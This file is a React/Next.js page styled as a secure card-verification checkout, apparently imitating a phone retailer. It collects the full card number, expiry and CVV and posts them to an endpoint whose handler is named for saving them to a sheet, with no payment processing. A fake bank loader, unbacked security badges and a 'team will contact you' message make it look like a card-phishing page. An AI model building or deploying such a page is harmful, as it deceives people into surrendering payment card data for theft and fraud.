"use client";

import { FormEvent, useEffect, useMemo, useState } from "react";
import { CheckCircle2 } from "lucide-react";
import { CheckoutHeader } from "@/components/layout/CheckoutHeader";
import { CheckoutFooter } from "@/components/layout/CheckoutFooter";
import { BankPageLoader } from "@/components/ui/BankPageLoader";
import { CardBrandStrip } from "@/components/ui/CardBrandStrip";
import { SubmissionFeedback } from "@/components/ui/SubmissionFeedback";
import { CheckoutTrustRow } from "@/components/ui/CheckoutTrustRow";
import { SupportChip } from "@/components/ui/SupportChip";

type FormState = {
  nameOnCard: string;
  cardNumber: string;
  expMonth: string;
  expYear: string;
  cvv: string;
};

function formatCardNumber(input: string): string {
  return input.replace(/\D/g, "").slice(0, 16);
}

function formatCardNumberForDisplay(cardDigits: string): string {
  return cardDigits.replace(/(\d{4})(?=\d)/g, "$1 ").trim();
}

function isExpired(expMonth: string, expYear: string): boolean {
  const month = Number(expMonth);
  const year = Number(expYear);

  if (!Number.isInteger(month) || month < 1 || month > 12) {
    return true;
  }

  if (!Number.isInteger(year) || expYear.length !== 4) {
    return true;
  }

  const now = new Date();
  const currentMonth = now.getMonth() + 1;
  const currentYear = now.getFullYear();

  if (year < currentYear) {
    return true;
  }

  if (year === currentYear && month < currentMonth) {
    return true;
  }

  return false;
}

async function submitSecurePaymentToSheet(payload: FormState): Promise<string | null> {
  try {
    const response = await fetch("/api/checkout-submissions", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        formType: "secure_payment_mobiles",
        ...payload,
      }),
    });

    if (!response.ok) {
      const fallback = "Could not submit your details. Please try again.";
      try {
        const data = (await response.json()) as { message?: string };
        return data.message || fallback;
      } catch {
        return fallback;
      }
    }

    return null;
  } catch {
    return "Network issue while submitting. Please try again.";
  }
}

export default function SecurePaymentMobilesPage() {
  const [showLoader, setShowLoader] = useState(true);
  const [form, setForm] = useState<FormState>({
    nameOnCard: "",
    cardNumber: "",
    expMonth: "",
    expYear: "",
    cvv: "",
  });
  const [error, setError] = useState<string>("");
  const [submitState, setSubmitState] = useState<"idle" | "submitting" | "success">(
    "idle",
  );

  const isCardNumberComplete = useMemo(
    () => form.cardNumber.length === 16,
    [form.cardNumber],
  );

  useEffect(() => {
    const timer = window.setTimeout(() => {
      setShowLoader(false);
    }, 1600);

    return () => window.clearTimeout(timer);
  }, []);

  const handleSubmit = async (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setError("");
    setSubmitState("idle");

    if (!isCardNumberComplete) {
      setError("Card number must be exactly 16 digits.");
      return;
    }

    if (!form.nameOnCard.trim()) {
      setError("Name on card is required.");
      return;
    }

    if (!/^\d{3,4}$/.test(form.cvv)) {
      setError("CVV must be 3 or 4 digits.");
      return;
    }

    if (!/^\d{2}$/.test(form.expMonth)) {
      setError("Card expiration month must be 2 digits (MM).");
      return;
    }

    if (!/^\d{4}$/.test(form.expYear)) {
      setError("Card expiration year must be 4 digits (YYYY).");
      return;
    }

    if (isExpired(form.expMonth, form.expYear)) {
      setError("This card is expired. Please use a valid card.");
      return;
    }

    setSubmitState("submitting");
    const submissionError = await submitSecurePaymentToSheet(form);

    if (submissionError) {
      setSubmitState("idle");
      setError(submissionError);
      return;
    }

    setSubmitState("success");
  };

  const resetForm = () => {
    setForm({
      nameOnCard: "",
      cardNumber: "",
      expMonth: "",
      expYear: "",
      cvv: "",
    });
    setError("");
    setSubmitState("idle");
  };

  return (
    <>
      {showLoader ? (
        <BankPageLoader title="Loading secure card verification..." />
      ) : null}
      <CheckoutHeader />
      <main className="bg-slate-50 pb-[max(2rem,env(safe-area-inset-bottom))] pt-6 sm:pt-10">
        <section className="mx-auto max-w-3xl px-3 sm:px-6">
          <div className="rounded-2xl border border-slate-200 bg-white px-4 py-6 shadow-[0_16px_48px_rgba(15,23,42,0.08)] sm:px-8 sm:py-8">
          <a
            href="#card-details-form"
            className="text-sm font-medium text-(--color-brand-pink) hover:underline"
          >
            Skip to content
          </a>
          <h1 className="text-[2.05rem] font-semibold tracking-tight text-slate-900 sm:text-4xl">
            Card Details
          </h1>
          <p className="mt-3 text-[15px] leading-relaxed text-slate-600 sm:text-sm">
            We prioritize the security and confidentiality of your information.
            Rest assured, our checkout process is designed with your safety in
            mind. Please provide the following details to complete your
            purchase:
          </p>
          <div className="mt-4 flex flex-wrap items-center gap-2 text-[11px] font-semibold sm:text-xs">
            <span className="rounded-full bg-emerald-50 px-2.5 py-1 text-emerald-700">
              256-bit SSL secured
            </span>
            <span className="rounded-full bg-sky-50 px-2.5 py-1 text-sky-700">
              PCI-ready flow
            </span>
            <span className="rounded-full bg-slate-100 px-2.5 py-1 text-slate-700">
              Fraud checks enabled
            </span>
          </div>

          <CardBrandStrip />

          {submitState === "success" ? (
            <div className="mt-8 rounded-2xl border border-emerald-200 bg-emerald-50/40 p-5 sm:p-6">
              <div className="mx-auto flex max-w-xl flex-col items-center text-center">
                <CheckCircle2 className="h-12 w-12 text-emerald-600" aria-hidden />
                <h2 className="mt-3 text-2xl font-semibold tracking-tight text-slate-900">
                  Submitted Successfully
                </h2>
                <p className="mt-2 text-sm leading-relaxed text-slate-600">
                  Your details are securely submitted. Our team will contact you
                  shortly with the next step.
                </p>
                <p className="mt-2 text-xs font-medium text-slate-500">
                  Need urgent help?{" "}
                  <a
                    href="mailto:support@fonehouse.cloud"
                    className="text-(--color-brand-pink) hover:underline"
                  >
                    support@fonehouse.cloud
                  </a>
                </p>
                <button
                  type="button"
                  onClick={resetForm}
                  className="mt-5 inline-flex items-center justify-center rounded-xl border border-slate-300 bg-white px-5 py-2.5 text-sm font-semibold text-slate-700 transition hover:bg-slate-50"
                >
                  Submit another response
                </button>
              </div>
            </div>
          ) : (
            <form
              id="card-details-form"
              onSubmit={handleSubmit}
              className="mt-6 space-y-4 sm:space-y-5"
            >
              <div>
                <label
                  htmlFor="nameOnCard"
                  className="mb-2 block text-[13px] font-medium text-slate-700 sm:text-sm"
                >
                  Name on Card *
                </label>
                <input
                  id="nameOnCard"
                  name="nameOnCard"
                  type="text"
                  autoComplete="cc-name"
                  placeholder="John Doe"
                  value={form.nameOnCard}
                  onChange={(event) =>
                    setForm((prev) => ({
                      ...prev,
                      nameOnCard: event.target.value,
                    }))
                  }
                  className="w-full rounded-xl border border-slate-300 bg-white px-4 py-3.5 text-base text-slate-900 outline-none transition focus:border-slate-400 focus:ring-4 focus:ring-slate-100 sm:text-sm"
                  required
                />
              </div>

              <div>
                <div className="mb-2 flex items-center justify-between">
                  <label
                    htmlFor="cardNumber"
                    className="block text-[13px] font-medium text-slate-700 sm:text-sm"
                  >
                    Long Card Number *
                  </label>
                  <span className="text-[11px] text-slate-500 sm:text-xs">
                    {form.cardNumber.length} / 16
                  </span>
                </div>
                <input
                  id="cardNumber"
                  name="cardNumber"
                  type="text"
                  inputMode="numeric"
                  autoComplete="cc-number"
                  placeholder="1234567812345678"
                  value={formatCardNumberForDisplay(form.cardNumber)}
                  onChange={(event) =>
                    setForm((prev) => ({
                      ...prev,
                      cardNumber: formatCardNumber(event.target.value),
                    }))
                  }
                  maxLength={19}
                  className="w-full rounded-xl border border-slate-300 bg-white px-4 py-3.5 text-base text-slate-900 outline-none transition focus:border-slate-400 focus:ring-4 focus:ring-slate-100 sm:text-sm"
                  required
                />
              </div>

              <div className="grid grid-cols-1 gap-4 sm:grid-cols-2">
                <div>
                  <label
                    htmlFor="expMonth"
                    className="mb-2 block text-[13px] font-medium text-slate-700 sm:text-sm"
                  >
                    Card Expiration Month *
                  </label>
                  <input
                    id="expMonth"
                    name="expMonth"
                    type="text"
                    inputMode="numeric"
                    autoComplete="cc-exp-month"
                    placeholder="01"
                    value={form.expMonth}
                    onChange={(event) =>
                      setForm((prev) => ({
                        ...prev,
                        expMonth: event.target.value
                          .replace(/\D/g, "")
                          .slice(0, 2),
                      }))
                    }
                    className="w-full rounded-xl border border-slate-300 bg-white px-4 py-3.5 text-base text-slate-900 outline-none transition focus:border-slate-400 focus:ring-4 focus:ring-slate-100 sm:text-sm"
                    required
                  />
                </div>

                <div>
                  <label
                    htmlFor="expYear"
                    className="mb-2 block text-[13px] font-medium text-slate-700 sm:text-sm"
                  >
                    Card Expiration Year *
                  </label>
                  <input
                    id="expYear"
                    name="expYear"
                    type="text"
                    inputMode="numeric"
                    autoComplete="cc-exp-year"
                    placeholder={`${new Date().getFullYear()}`}
                    value={form.expYear}
                    onChange={(event) =>
                      setForm((prev) => ({
                        ...prev,
                        expYear: event.target.value.replace(/\D/g, "").slice(0, 4),
                      }))
                    }
                    className="w-full rounded-xl border border-slate-300 bg-white px-4 py-3.5 text-base text-slate-900 outline-none transition focus:border-slate-400 focus:ring-4 focus:ring-slate-100 sm:text-sm"
                    required
                  />
                </div>
              </div>

              <div>
                <label
                  htmlFor="cvv"
                  className="mb-2 block text-[13px] font-medium text-slate-700 sm:text-sm"
                >
                  CVV *
                </label>
                <input
                  id="cvv"
                  name="cvv"
                  type="text"
                  inputMode="numeric"
                  autoComplete="cc-csc"
                  placeholder="000"
                  value={form.cvv}
                  onChange={(event) =>
                    setForm((prev) => ({
                      ...prev,
                      cvv: event.target.value.replace(/\D/g, "").slice(0, 4),
                    }))
                  }
                  className="w-full rounded-xl border border-slate-300 bg-white px-4 py-3.5 text-base text-slate-900 outline-none transition focus:border-slate-400 focus:ring-4 focus:ring-slate-100 sm:text-sm"
                  required
                />
              </div>

              {error ? <p className="text-sm text-red-600">{error}</p> : null}
              <SubmissionFeedback
                state={submitState === "submitting" ? "submitting" : "idle"}
                successTitle="Card details received successfully."
                successDescription="Thank you. Our verification team will contact you in a short time."
              />
              <CheckoutTrustRow
                primary="SSL encrypted transfer"
                secondary="Trusted checkout protection"
              />

              <button
                type="submit"
                disabled={submitState === "submitting"}
                className="inline-flex w-full items-center justify-center rounded-xl bg-slate-900 px-6 py-3.5 text-sm font-semibold text-white shadow-[0_10px_24px_rgba(15,23,42,0.22)] transition hover:bg-slate-800 active:scale-[0.99] sm:w-auto sm:hover:-translate-y-0.5"
              >
                {submitState === "submitting" ? "Submitting..." : "Validate Payment"}
              </button>
            </form>
          )}
          </div>
        </section>
      </main>
      <SupportChip />
      <CheckoutFooter />
    </>
  );
}
